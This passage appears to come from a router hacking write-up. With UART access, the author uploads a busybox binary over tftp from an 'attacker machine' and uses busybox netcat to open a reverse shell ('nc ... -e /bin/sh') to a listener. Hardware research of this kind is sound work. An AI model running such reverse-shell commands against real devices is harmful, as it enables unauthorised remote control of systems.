Download busybox binary from https://busybox.net/downloads/binaries/
We download the busybox in the same version (v1.19.2) as installed on the router to make sure that it works.
In our case we download the binary **busybox-mipsel**, this is for MIPS little endian, as output by **file**.

Now we need to find a place where to put the binary. We can see from the mount command that the squashfs file system we are on, is read-only:

But we can use ramfs mounted on /var to store files, as this is read-writable.
We are gonna create a new directory in /var/tmp to upload our tools:
```bash
cd /var/tmp
mkdir _MY_TOOLS_
cd _MY_TOOLS_
```

Make sure the binary is in the tftp folder on our attacker machine. Then upload the binary to the router via the UART shell:
```bash
tftp -g -r busybox-mipsel 192.168.0.100
```

The python tftp server had a bug and I had to resolve it:

Afterwards the binary could be transferred:

Change permission on the binary:
```bash
chmod 777 busybox-mipsel
```

With the full busybox binary we get access to the **netcat** utility. With it we can get a proper shell instead of the junky UART shell.
Create a listener on the attacker machine:
```bash
nc -vlnp 1337
```

On the router:
```bash
./busybox-mipsel nc 192.168.0.100 1337 -e /bin/sh
```
